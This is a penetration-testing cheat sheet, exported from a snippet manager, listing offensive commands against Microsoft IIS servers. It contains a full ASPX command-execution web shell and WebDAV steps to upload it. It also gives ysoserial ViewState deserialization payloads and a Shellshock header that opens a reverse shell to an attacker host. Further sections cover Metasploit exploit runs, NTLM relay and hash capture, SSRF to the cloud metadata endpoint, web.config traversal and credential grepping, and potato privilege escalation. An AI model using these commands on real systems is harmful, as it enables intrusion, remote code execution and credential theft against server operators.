---
id: "31du2qg27mptl2bap"
title: "iis"
description: ""
tags: []
order: "11"
createdAt: "2026-05-31T09:34:27.505Z"
updatedAt: "2026-05-31T09:34:37.307Z"
---

## Reconnaissance
<!-- section: {"id":"xlofgoxw6mptl2icd","order":0,"collapsed":false} -->

### d4wf0a4xemptl2ieu
```bash
nmap -sV -sC -p 80,443,8080,8443 $TARGET
```

_Reconnaissance Detect IIS version and technology stack._

**Tags:** iis, recon, nmap, whatweb
<!-- cmd: {"id":"d4wf0a4xemptl2ieu","language":"bash","sectionId":"xlofgoxw6mptl2icd","tags":["iis","recon","nmap","whatweb"]} -->

### 2ntkontddmptl2if2
```bash
curl -sI http://$TARGET | grep -i "server\|x-powered-by\|x-aspnet"
```

**Tags:** iis, recon, nmap, whatweb
<!-- cmd: {"id":"2ntkontddmptl2if2","language":"bash","sectionId":"xlofgoxw6mptl2icd","tags":["iis","recon","nmap","whatweb"]} -->

### hmha3e0vzmptl2if6
```bash
whatweb http://$TARGET
```

**Tags:** iis, recon, nmap, whatweb
<!-- cmd: {"id":"hmha3e0vzmptl2if6","language":"bash","sectionId":"xlofgoxw6mptl2icd","tags":["iis","recon","nmap","whatweb"]} -->

### blprwy6ajmptl2ifb
```bash
nikto -h http://$TARGET
```

**Tags:** iis, recon, nmap, whatweb
<!-- cmd: {"id":"blprwy6ajmptl2ifb","language":"bash","sectionId":"xlofgoxw6mptl2icd","tags":["iis","recon","nmap","whatweb"]} -->

### 1ezc9noxumptl2iff
```bash
curl -sk https://$TARGET -o /dev/null -D - | grep -i server
```

**Tags:** iis, recon, nmap, whatweb
<!-- cmd: {"id":"1ezc9noxumptl2iff","language":"bash","sectionId":"xlofgoxw6mptl2icd","tags":["iis","recon","nmap","whatweb"]} -->

## Directory & File Enumeration
<!-- section: {"id":"o7c712s3wmptl2icj","order":1,"collapsed":false} -->

### 3k09t3v95mptl2ifx
```bash
feroxbuster -u http://$TARGET -x aspx,asp,config,txt,bak,zip,xml,json,cs -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

_Directory & File Enumeration_

**Tags:** iis, enumeration, directories, feroxbuster, ffuf
<!-- cmd: {"id":"3k09t3v95mptl2ifx","language":"bash","sectionId":"o7c712s3wmptl2icj","tags":["iis","enumeration","directories","feroxbuster","ffuf"]} -->

### a7l4xw8xhmptl2ig2
```bash
gobuster dir -u http://$TARGET -x aspx,asp,config,txt -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

**Tags:** iis, enumeration, directories, feroxbuster, ffuf
<!-- cmd: {"id":"a7l4xw8xhmptl2ig2","language":"bash","sectionId":"o7c712s3wmptl2icj","tags":["iis","enumeration","directories","feroxbuster","ffuf"]} -->

### nnxxwck36mptl2ig7
```bash
ffuf -u http://$TARGET/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .aspx,.asp,.config,.txt,.bak -mc 200,301,302,403
```

**Tags:** iis, enumeration, directories, feroxbuster, ffuf
<!-- cmd: {"id":"nnxxwck36mptl2ig7","language":"bash","sectionId":"o7c712s3wmptl2icj","tags":["iis","enumeration","directories","feroxbuster","ffuf"]} -->

### iopczaa78mptl2igc
```bash
curl -s http://$TARGET/web.config
```

**Tags:** iis, enumeration, directories, feroxbuster, ffuf
<!-- cmd: {"id":"iopczaa78mptl2igc","language":"bash","sectionId":"o7c712s3wmptl2icj","tags":["iis","enumeration","directories","feroxbuster","ffuf"]} -->

### udsp2amsemptl2igg
```bash
curl -s http://$TARGET/global.asax
```

**Tags:** iis, enumeration, directories, feroxbuster, ffuf
<!-- cmd: {"id":"udsp2amsemptl2igg","language":"bash","sectionId":"o7c712s3wmptl2icj","tags":["iis","enumeration","directories","feroxbuster","ffuf"]} -->

### nm9hep0vlmptl2igm
```bash
curl -s http://$TARGET/machine.config
```

**Tags:** iis, enumeration, directories, feroxbuster, ffuf
<!-- cmd: {"id":"nm9hep0vlmptl2igm","language":"bash","sectionId":"o7c712s3wmptl2icj","tags":["iis","enumeration","directories","feroxbuster","ffuf"]} -->

### wv5jvd8yxmptl2igr
```bash
curl -s "http://$TARGET/iisstart.htm"
```

**Tags:** iis, enumeration, directories, feroxbuster, ffuf
<!-- cmd: {"id":"wv5jvd8yxmptl2igr","language":"bash","sectionId":"o7c712s3wmptl2icj","tags":["iis","enumeration","directories","feroxbuster","ffuf"]} -->

### j9tx38fncmptl2igv
```bash
curl -s "http://$TARGET/trace.axd"
```

**Tags:** iis, enumeration, directories, feroxbuster, ffuf
<!-- cmd: {"id":"j9tx38fncmptl2igv","language":"bash","sectionId":"o7c712s3wmptl2icj","tags":["iis","enumeration","directories","feroxbuster","ffuf"]} -->

### fstgagqg7mptl2igz
```bash
curl -s "http://$TARGET/elmah.axd"
```

**Tags:** iis, enumeration, directories, feroxbuster, ffuf
<!-- cmd: {"id":"fstgagqg7mptl2igz","language":"bash","sectionId":"o7c712s3wmptl2icj","tags":["iis","enumeration","directories","feroxbuster","ffuf"]} -->

## IIS Shortname Vulnerability (CVE-2010-2730)
<!-- section: {"id":"xjz3ng9zamptl2ico","order":2,"collapsed":false} -->

### ez60z8es6mptl2ihg
```bash
curl -s "http://$TARGET/A*~1*/.aspx" -o /dev/null -w "%{http_code}"
```

_IIS Shortname Vulnerability (CVE-2010-2730) IIS reveals 8.3 filenames via ~1 tilde trick — useful for finding hidden files._

**Tags:** iis, shortname, cve, enumeration, tilde
<!-- cmd: {"id":"ez60z8es6mptl2ihg","language":"bash","sectionId":"xjz3ng9zamptl2ico","tags":["iis","shortname","cve","enumeration","tilde"]} -->

### phkuntcd0mptl2ihl
```bash
git clone https://github.com/irsdl/IIS-ShortName-Scanner
```

**Tags:** iis, shortname, cve, enumeration, tilde
<!-- cmd: {"id":"phkuntcd0mptl2ihl","language":"bash","sectionId":"xjz3ng9zamptl2ico","tags":["iis","shortname","cve","enumeration","tilde"]} -->

### cp7ksjqh8mptl2ihp
```bash
java -jar iis_shortname_scanner.jar 2 20 http://$TARGET/
```

_shortname_

**Tags:** iis, shortname, cve, enumeration, tilde
<!-- cmd: {"id":"cp7ksjqh8mptl2ihp","language":"bash","sectionId":"xjz3ng9zamptl2ico","tags":["iis","shortname","cve","enumeration","tilde"]} -->

### pqogqxgdymptl2ihu
```bash
python3 shortname_scanner.py -u http://$TARGET
```

**Tags:** iis, shortname, cve, enumeration, tilde
<!-- cmd: {"id":"pqogqxgdymptl2ihu","language":"bash","sectionId":"xjz3ng9zamptl2ico","tags":["iis","shortname","cve","enumeration","tilde"]} -->

### hnen1djk3mptl2ihy
```bash
curl -s "http://$TARGET/s*~1*/.aspx" | head -5
```

**Tags:** iis, shortname, cve, enumeration, tilde
<!-- cmd: {"id":"hnen1djk3mptl2ihy","language":"bash","sectionId":"xjz3ng9zamptl2ico","tags":["iis","shortname","cve","enumeration","tilde"]} -->

## PUT Method / WebDAV
<!-- section: {"id":"66w20wc9wmptl2ict","order":3,"collapsed":false} -->

### vp6w9f6famptl2ii8
```bash
curl -vX OPTIONS http://$TARGET/
```

_PUT Method / WebDAV_

**Tags:** iis, webdav, put, fileupload, exploitation
<!-- cmd: {"id":"vp6w9f6famptl2ii8","language":"bash","sectionId":"66w20wc9wmptl2ict","tags":["iis","webdav","put","fileupload","exploitation"]} -->

### 5ugduqir2mptl2iid
```bash
nmap -p 80,443 --script http-webdav-scan $TARGET
```

**Tags:** iis, webdav, put, fileupload, exploitation
<!-- cmd: {"id":"5ugduqir2mptl2iid","language":"bash","sectionId":"66w20wc9wmptl2ict","tags":["iis","webdav","put","fileupload","exploitation"]} -->

### 14j60jhf6mptl2iih
```bash
davtest -url http://$TARGET/
```

**Tags:** iis, webdav, put, fileupload, exploitation
<!-- cmd: {"id":"14j60jhf6mptl2iih","language":"bash","sectionId":"66w20wc9wmptl2ict","tags":["iis","webdav","put","fileupload","exploitation"]} -->

### r50d2atlamptl2iil
```bash
cadaver http://$TARGET/
```

**Tags:** iis, webdav, put, fileupload, exploitation
<!-- cmd: {"id":"r50d2atlamptl2iil","language":"bash","sectionId":"66w20wc9wmptl2ict","tags":["iis","webdav","put","fileupload","exploitation"]} -->

### edglfvdxjmptl2iiq
```bash
curl -X PUT http://$TARGET/shell.aspx -d '<%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd()); %>'
```

**Tags:** iis, webdav, put, fileupload, exploitation
<!-- cmd: {"id":"edglfvdxjmptl2iiq","language":"bash","sectionId":"66w20wc9wmptl2ict","tags":["iis","webdav","put","fileupload","exploitation"]} -->

### wyvjevy3amptl2iiv
```bash
curl -X PUT http://$TARGET/shell.txt --data-binary @shell.aspx
```

**Tags:** iis, webdav, put, fileupload, exploitation
<!-- cmd: {"id":"wyvjevy3amptl2iiv","language":"bash","sectionId":"66w20wc9wmptl2ict","tags":["iis","webdav","put","fileupload","exploitation"]} -->

### xoccxu7hcmptl2ij0
```bash
curl -X MOVE --header "Destination:http://$TARGET/shell.aspx" http://$TARGET/shell.txt
```

**Tags:** iis, webdav, put, fileupload, exploitation
<!-- cmd: {"id":"xoccxu7hcmptl2ij0","language":"bash","sectionId":"66w20wc9wmptl2ict","tags":["iis","webdav","put","fileupload","exploitation"]} -->

## ASP.NET Viewstate Deserialization
<!-- section: {"id":"ul3wqagr7mptl2icw","order":4,"collapsed":false} -->

### 5y7myd0xymptl2ijf
```bash
curl -s http://$TARGET/page.aspx | grep "__VIEWSTATE"
```

_ASP.NET Viewstate Deserialization_

**Tags:** iis, viewstate, deserialization, exploitation, aspnet
<!-- cmd: {"id":"5y7myd0xymptl2ijf","language":"bash","sectionId":"ul3wqagr7mptl2icw","tags":["iis","viewstate","deserialization","exploitation","aspnet"]} -->

### c3vjud47pmptl2ijl
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "whoami" --generator=XXXX --validationalg="SHA1" --validationkey="XXXXXXXX"
```

**Tags:** iis, viewstate, deserialization, exploitation, aspnet
<!-- cmd: {"id":"c3vjud47pmptl2ijl","language":"bash","sectionId":"ul3wqagr7mptl2icw","tags":["iis","viewstate","deserialization","exploitation","aspnet"]} -->

### zl83nvzdimptl2ijq
```bash
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell -e $B64_PAYLOAD" --generator=XXXX --validationalg="SHA1" --validationkey="$MACHINEKEY" --isdebug
```

**Tags:** iis, viewstate, deserialization, exploitation, aspnet
<!-- cmd: {"id":"zl83nvzdimptl2ijq","language":"bash","sectionId":"ul3wqagr7mptl2icw","tags":["iis","viewstate","deserialization","exploitation","aspnet"]} -->

### 30nwgw76wmptl2iju
```bash
grep -r "machineKey\|validationKey\|decryptionKey" /path/to/webroot/
```

**Tags:** iis, viewstate, deserialization, exploitation, aspnet
<!-- cmd: {"id":"30nwgw76wmptl2iju","language":"bash","sectionId":"ul3wqagr7mptl2icw","tags":["iis","viewstate","deserialization","exploitation","aspnet"]} -->

## web.config — Sensitive Data
<!-- section: {"id":"bchhlcmz1mptl2id1","order":5,"collapsed":false} -->

### n8ztyyr5tmptl2ik4
```bash
curl -s http://$TARGET/web.config
```

_web.config — Sensitive Data_

**Tags:** iis, webconfig, sensitive-data, credentials
<!-- cmd: {"id":"n8ztyyr5tmptl2ik4","language":"bash","sectionId":"bchhlcmz1mptl2id1","tags":["iis","webconfig","sensitive-data","credentials"]} -->

### vquhpspjomptl2ikb
```bash
curl -s http://$TARGET/Web.config
```

**Tags:** iis, webconfig, sensitive-data, credentials
<!-- cmd: {"id":"vquhpspjomptl2ikb","language":"bash","sectionId":"bchhlcmz1mptl2id1","tags":["iis","webconfig","sensitive-data","credentials"]} -->

### ex22i92k0mptl2ikf
```bash
curl -s http://$TARGET/WEB.CONFIG
```

**Tags:** iis, webconfig, sensitive-data, credentials
<!-- cmd: {"id":"ex22i92k0mptl2ikf","language":"bash","sectionId":"bchhlcmz1mptl2id1","tags":["iis","webconfig","sensitive-data","credentials"]} -->

### g33wg03l6mptl2ikl
```bash
curl -s "http://$TARGET/path/..%2F..%2Fweb.config"
```

**Tags:** iis, webconfig, sensitive-data, credentials
<!-- cmd: {"id":"g33wg03l6mptl2ikl","language":"bash","sectionId":"bchhlcmz1mptl2id1","tags":["iis","webconfig","sensitive-data","credentials"]} -->

### ejuce4bwjmptl2ikp
```bash
grep -i "connectionString\|password\|username\|secret\|key" web.config
```

**Tags:** iis, webconfig, sensitive-data, credentials
<!-- cmd: {"id":"ejuce4bwjmptl2ikp","language":"bash","sectionId":"bchhlcmz1mptl2id1","tags":["iis","webconfig","sensitive-data","credentials"]} -->

### 83j5zn4m1mptl2ikt
```bash
grep -i "machineKey\|validationKey\|decryptionKey" web.config
```

**Tags:** iis, webconfig, sensitive-data, credentials
<!-- cmd: {"id":"83j5zn4m1mptl2ikt","language":"bash","sectionId":"bchhlcmz1mptl2id1","tags":["iis","webconfig","sensitive-data","credentials"]} -->

## SSRF / Internal Network Discovery
<!-- section: {"id":"1pteskhd9mptl2id5","order":6,"collapsed":false} -->

### zwiwqeaexmptl2il4
```bash
curl -s "http://$TARGET/page.aspx?url=http://169.254.169.254/latest/meta-data/"
```

_SSRF / Internal Network Discovery_

**Tags:** iis, ssrf
<!-- cmd: {"id":"zwiwqeaexmptl2il4","language":"bash","sectionId":"1pteskhd9mptl2id5","tags":["iis","ssrf"]} -->

### iw7ki4uk9mptl2il8
```bash
curl -s "http://$TARGET/redirect?to=http://internal-server/"
```

**Tags:** iis, ssrf
<!-- cmd: {"id":"iw7ki4uk9mptl2il8","language":"bash","sectionId":"1pteskhd9mptl2id5","tags":["iis","ssrf"]} -->

## NTLM Authentication Abuse
<!-- section: {"id":"834hxd5lwmptl2id9","order":7,"collapsed":false} -->

### gtth4nxxemptl2ilo
```bash
responder -I eth0 -wv
```

_NTLM Authentication Abuse IIS often uses Windows NTLM/Negotiate — capture hashes._

**Tags:** iis, ntlm, responder, relay, hash-capture
<!-- cmd: {"id":"gtth4nxxemptl2ilo","language":"bash","sectionId":"834hxd5lwmptl2id9","tags":["iis","ntlm","responder","relay","hash-capture"]} -->

### u9oty3f9pmptl2ilu
```bash
curl -s -I http://$TARGET/api/endpoint
```

**Tags:** iis, ntlm, responder, relay, hash-capture
<!-- cmd: {"id":"u9oty3f9pmptl2ilu","language":"bash","sectionId":"834hxd5lwmptl2id9","tags":["iis","ntlm","responder","relay","hash-capture"]} -->

### fs7asvem2mptl2ilz
```bash
ntlmrelayx.py -t http://$TARGET/ -smb2support
```

**Tags:** iis, ntlm, responder, relay, hash-capture
<!-- cmd: {"id":"fs7asvem2mptl2ilz","language":"bash","sectionId":"834hxd5lwmptl2id9","tags":["iis","ntlm","responder","relay","hash-capture"]} -->

## Common Vulnerabilities — CVEs
<!-- section: {"id":"02vpp8se0mptl2ide","order":8,"collapsed":false} -->

### nake75p3emptl2imb
```bash
msfconsole -q -x "use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS $TARGET; run"
```

_webdav_

**Tags:** iis, cve, exploitation, metasploit
<!-- cmd: {"id":"nake75p3emptl2imb","language":"bash","sectionId":"02vpp8se0mptl2ide","tags":["iis","cve","exploitation","metasploit"]} -->

### f8szbcuokmptl2img
```bash
msfconsole -q -x "use exploit/windows/iis/ms03_007_ntdll_webdav; set RHOSTS $TARGET; run"
```

_007_

**Tags:** iis, cve, exploitation, metasploit
<!-- cmd: {"id":"f8szbcuokmptl2img","language":"bash","sectionId":"02vpp8se0mptl2ide","tags":["iis","cve","exploitation","metasploit"]} -->

### k4sfjyk9hmptl2imm
```bash
java -jar iis_shortname_scanner.jar 2 20 http://$TARGET/
```

_shortname_

**Tags:** iis, cve, exploitation, metasploit
<!-- cmd: {"id":"k4sfjyk9hmptl2imm","language":"bash","sectionId":"02vpp8se0mptl2ide","tags":["iis","cve","exploitation","metasploit"]} -->

### 751qt0j4dmptl2imr
```bash
curl -s -H "Range: bytes=0-18446744073709551615" http://$TARGET/welcome.png
```

**Tags:** iis, cve, exploitation, metasploit
<!-- cmd: {"id":"751qt0j4dmptl2imr","language":"bash","sectionId":"02vpp8se0mptl2ide","tags":["iis","cve","exploitation","metasploit"]} -->

### fnhlnd22rmptl2imv
```bash
nmap -p 80 --script http-vuln-ms15-034 $TARGET
```

**Tags:** iis, cve, exploitation, metasploit
<!-- cmd: {"id":"fnhlnd22rmptl2imv","language":"bash","sectionId":"02vpp8se0mptl2ide","tags":["iis","cve","exploitation","metasploit"]} -->

### vs8j9b17nmptl2in0
```bash
curl -H "User-Agent: () { :;}; /bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'" http://$TARGET/cgi-bin/test.cgi
```

**Tags:** iis, cve, exploitation, metasploit
<!-- cmd: {"id":"vs8j9b17nmptl2in0","language":"bash","sectionId":"02vpp8se0mptl2ide","tags":["iis","cve","exploitation","metasploit"]} -->

## ASP.NET Debug Mode
<!-- section: {"id":"v5mgejgi0mptl2idj","order":9,"collapsed":false} -->

### aaeq436abmptl2ine
```bash
curl -s http://$TARGET/trace.axd
```

_ASP.NET Debug Mode_

**Tags:** iis, debug, information-disclosure, aspnet
<!-- cmd: {"id":"aaeq436abmptl2ine","language":"bash","sectionId":"v5mgejgi0mptl2idj","tags":["iis","debug","information-disclosure","aspnet"]} -->

### virf18bclmptl2inj
```bash
curl -s http://$TARGET/elmah.axd
```

**Tags:** iis, debug, information-disclosure, aspnet
<!-- cmd: {"id":"virf18bclmptl2inj","language":"bash","sectionId":"v5mgejgi0mptl2idj","tags":["iis","debug","information-disclosure","aspnet"]} -->

### gy2pf6k22mptl2ino
```bash
curl -s http://$TARGET/elmah.axd?async=true
```

**Tags:** iis, debug, information-disclosure, aspnet
<!-- cmd: {"id":"gy2pf6k22mptl2ino","language":"bash","sectionId":"v5mgejgi0mptl2idj","tags":["iis","debug","information-disclosure","aspnet"]} -->

### x4gz3fbyomptl2ins
```bash
curl -s "http://$TARGET/WebResource.axd?d=xxx"
```

**Tags:** iis, debug, information-disclosure, aspnet
<!-- cmd: {"id":"x4gz3fbyomptl2ins","language":"bash","sectionId":"v5mgejgi0mptl2idj","tags":["iis","debug","information-disclosure","aspnet"]} -->

### 28yw8s85nmptl2iny
```bash
curl -s http://$TARGET/ -H "Custom-Debug: true"
```

**Tags:** iis, debug, information-disclosure, aspnet
<!-- cmd: {"id":"28yw8s85nmptl2iny","language":"bash","sectionId":"v5mgejgi0mptl2idj","tags":["iis","debug","information-disclosure","aspnet"]} -->

## File Upload Bypass
<!-- section: {"id":"esjq6i6ivmptl2idm","order":10,"collapsed":false} -->

### 9keigm3udmptl2ioi
```bash
shell.aspx.jpg
```

_File Upload Bypass_

**Tags:** iis, fileupload, bypass, webshell
<!-- cmd: {"id":"9keigm3udmptl2ioi","language":"bash","sectionId":"esjq6i6ivmptl2idm","tags":["iis","fileupload","bypass","webshell"]} -->

### 983y25kk0mptl2iom
```bash
shell.asp;.jpg
```

**Tags:** iis, fileupload, bypass, webshell
<!-- cmd: {"id":"983y25kk0mptl2iom","language":"bash","sectionId":"esjq6i6ivmptl2idm","tags":["iis","fileupload","bypass","webshell"]} -->

### t1hue18mvmptl2iot
```bash
shell.asp%00.jpg
```

**Tags:** iis, fileupload, bypass, webshell
<!-- cmd: {"id":"t1hue18mvmptl2iot","language":"bash","sectionId":"esjq6i6ivmptl2idm","tags":["iis","fileupload","bypass","webshell"]} -->

### il8n8w2o5mptl2ioz
```bash
shell.asp/shell.jpg
```

**Tags:** iis, fileupload, bypass, webshell
<!-- cmd: {"id":"il8n8w2o5mptl2ioz","language":"bash","sectionId":"esjq6i6ivmptl2idm","tags":["iis","fileupload","bypass","webshell"]} -->

### i3ktakeermptl2ip3
```bash
.aspx .asp .ashx .asmx .asax .cer .cdx .asa
```

**Tags:** iis, fileupload, bypass, webshell
<!-- cmd: {"id":"i3ktakeermptl2ip3","language":"bash","sectionId":"esjq6i6ivmptl2idm","tags":["iis","fileupload","bypass","webshell"]} -->

### zd19or32zmptl2ip8
```bash
cadaver http://$TARGET/
```

**Tags:** iis, fileupload, bypass, webshell
<!-- cmd: {"id":"zd19or32zmptl2ip8","language":"bash","sectionId":"esjq6i6ivmptl2idm","tags":["iis","fileupload","bypass","webshell"]} -->

### skqlhmhhfmptl2ipd
```bash
dav:/> put shell.aspx
```

**Tags:** iis, fileupload, bypass, webshell
<!-- cmd: {"id":"skqlhmhhfmptl2ipd","language":"bash","sectionId":"esjq6i6ivmptl2idm","tags":["iis","fileupload","bypass","webshell"]} -->

## ASPX Webshell
<!-- section: {"id":"3h5kbuhx1mptl2idr","order":11,"collapsed":false} -->

### 2t9o3m9jnmptl2ipr
```bash
cat > shell.aspx << 'EOF'
```

_ASPX Webshell_

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"2t9o3m9jnmptl2ipr","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### 12gkcfoy4mptl2ipw
```bash
<%@ Page Language="C#" %>
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"12gkcfoy4mptl2ipw","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### cilc6lwkzmptl2iq1
```bash
<%@ Import Namespace="System.Diagnostics" %>
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"cilc6lwkzmptl2iq1","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### d5dv9nqtqmptl2iq7
```bash
<%
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"d5dv9nqtqmptl2iq7","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### 7x5uupi45mptl2iqc
```bash
string cmd = Request["cmd"];
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"7x5uupi45mptl2iqc","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### bh4mc45azmptl2iqi
```bash
Process p = new Process();
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"bh4mc45azmptl2iqi","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### yxbjtyjr8mptl2iqn
```bash
p.StartInfo.FileName = "cmd.exe";
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"yxbjtyjr8mptl2iqn","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### fd8fqkk8omptl2iqs
```bash
p.StartInfo.Arguments = "/c " + cmd;
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"fd8fqkk8omptl2iqs","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### ckra5qnjfmptl2iqw
```bash
p.StartInfo.UseShellExecute = false;
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"ckra5qnjfmptl2iqw","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### bz9s2dfylmptl2ir2
```bash
p.StartInfo.RedirectStandardOutput = true;
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"bz9s2dfylmptl2ir2","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### 81pj7pm11mptl2ir7
```bash
p.Start();
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"81pj7pm11mptl2ir7","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### 36nze449hmptl2ird
```bash
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"36nze449hmptl2ird","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### 1gv6ncg5cmptl2irh
```bash
%>
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"1gv6ncg5cmptl2irh","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

### 3ra5bovi0mptl2irn
```bash
EOF
```

**Tags:** iis, webshell, aspx, post-exploitation
<!-- cmd: {"id":"3ra5bovi0mptl2irn","language":"bash","sectionId":"3h5kbuhx1mptl2idr","tags":["iis","webshell","aspx","post-exploitation"]} -->

## Post-Exploitation — IIS Context
<!-- section: {"id":"3mkh5bqekmptl2idv","order":12,"collapsed":false} -->

### 6kv12dxkumptl2is9
```bash
whoami /priv
```

_Post-Exploitation — IIS Context_

**Tags:** iis, post-exploitation, privesc, seimpersonate, potato
<!-- cmd: {"id":"6kv12dxkumptl2is9","language":"bash","sectionId":"3mkh5bqekmptl2idv","tags":["iis","post-exploitation","privesc","seimpersonate","potato"]} -->

### 1pcsvibahmptl2isf
```bash
PrintSpoofer.exe -i -c cmd
```

**Tags:** iis, post-exploitation, privesc, seimpersonate, potato
<!-- cmd: {"id":"1pcsvibahmptl2isf","language":"bash","sectionId":"3mkh5bqekmptl2idv","tags":["iis","post-exploitation","privesc","seimpersonate","potato"]} -->

### t2f8sizyqmptl2isj
```bash
GodPotato.exe -cmd "cmd /c whoami"
```

**Tags:** iis, post-exploitation, privesc, seimpersonate, potato
<!-- cmd: {"id":"t2f8sizyqmptl2isj","language":"bash","sectionId":"3mkh5bqekmptl2idv","tags":["iis","post-exploitation","privesc","seimpersonate","potato"]} -->

### xxu4071s4mptl2iso
```bash
JuicyPotatoNG.exe -t * -p cmd.exe -a "/c whoami"
```

**Tags:** iis, post-exploitation, privesc, seimpersonate, potato
<!-- cmd: {"id":"xxu4071s4mptl2iso","language":"bash","sectionId":"3mkh5bqekmptl2idv","tags":["iis","post-exploitation","privesc","seimpersonate","potato"]} -->

### 49vfuwitmmptl2isu
```bash
findstr /si "password connectionstring" C:\inetpub\wwwroot\*.config
```

**Tags:** iis, post-exploitation, privesc, seimpersonate, potato
<!-- cmd: {"id":"49vfuwitmmptl2isu","language":"bash","sectionId":"3mkh5bqekmptl2idv","tags":["iis","post-exploitation","privesc","seimpersonate","potato"]} -->

### dfrkmvvtymptl2isz
```bash
findstr /si "password" C:\Windows\System32\inetsrv\config\applicationHost.config
```

**Tags:** iis, post-exploitation, privesc, seimpersonate, potato
<!-- cmd: {"id":"dfrkmvvtymptl2isz","language":"bash","sectionId":"3mkh5bqekmptl2idv","tags":["iis","post-exploitation","privesc","seimpersonate","potato"]} -->

## IIS Config File Locations (Windows)
<!-- section: {"id":"6kwc8thrlmptl2idz","order":13,"collapsed":false} -->

### 2g2sp1yrpmptl2itd
```bash
C:\inetpub\wwwroot\web.config
```

_IIS Config File Locations (Windows)_

**Tags:** iis, configuration, paths
<!-- cmd: {"id":"2g2sp1yrpmptl2itd","language":"bash","sectionId":"6kwc8thrlmptl2idz","tags":["iis","configuration","paths"]} -->

### 6xoi42p04mptl2iti
```bash
C:\inetpub\wwwroot\global.asax
```

**Tags:** iis, configuration, paths
<!-- cmd: {"id":"6xoi42p04mptl2iti","language":"bash","sectionId":"6kwc8thrlmptl2idz","tags":["iis","configuration","paths"]} -->

### vn4yb2sh6mptl2ito
```bash
C:\Windows\System32\inetsrv\config\applicationHost.config
```

**Tags:** iis, configuration, paths
<!-- cmd: {"id":"vn4yb2sh6mptl2ito","language":"bash","sectionId":"6kwc8thrlmptl2idz","tags":["iis","configuration","paths"]} -->

### y0s6o5pxxmptl2itu
```bash
C:\Windows\System32\inetsrv\config\schema\
```

**Tags:** iis, configuration, paths
<!-- cmd: {"id":"y0s6o5pxxmptl2itu","language":"bash","sectionId":"6kwc8thrlmptl2idz","tags":["iis","configuration","paths"]} -->

### 6i31r9my6mptl2itz
```bash
C:\inetpub\logs\LogFiles\W3SVC1\
```

**Tags:** iis, configuration, paths
<!-- cmd: {"id":"6i31r9my6mptl2itz","language":"bash","sectionId":"6kwc8thrlmptl2idz","tags":["iis","configuration","paths"]} -->

### zzoh6qbz4mptl2iu4
```bash
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\CONFIG\machine.config
```

**Tags:** iis, configuration, paths
<!-- cmd: {"id":"zzoh6qbz4mptl2iu4","language":"bash","sectionId":"6kwc8thrlmptl2idz","tags":["iis","configuration","paths"]} -->

## Nuclei Scanning
<!-- section: {"id":"mfjha9glsmptl2ie3","order":14,"collapsed":false} -->

### uyo3dbai4mptl2iuq
```bash
nuclei -u http://$TARGET -t /root/nuclei-templates/vulnerabilities/iis/ -t /root/nuclei-templates/exposures/configs/
```

_Nuclei Scanning_

**Tags:** iis, nuclei, scanning
<!-- cmd: {"id":"uyo3dbai4mptl2iuq","language":"bash","sectionId":"mfjha9glsmptl2ie3","tags":["iis","nuclei","scanning"]} -->

### u2q10elmfmptl2iuu
```bash
nuclei -u http://$TARGET -tags iis,aspx,microsoft
```

**Tags:** iis, nuclei, scanning
<!-- cmd: {"id":"u2q10elmfmptl2iuu","language":"bash","sectionId":"mfjha9glsmptl2ie3","tags":["iis","nuclei","scanning"]} -->

### 46unc00xfmptl2iuz
```bash
nuclei -u http://$TARGET -t /root/nuclei-templates/vulnerabilities/generic/ -tags lfi,ssti,sqli
```

**Tags:** iis, nuclei, scanning
<!-- cmd: {"id":"46unc00xfmptl2iuz","language":"bash","sectionId":"mfjha9glsmptl2ie3","tags":["iis","nuclei","scanning"]} -->
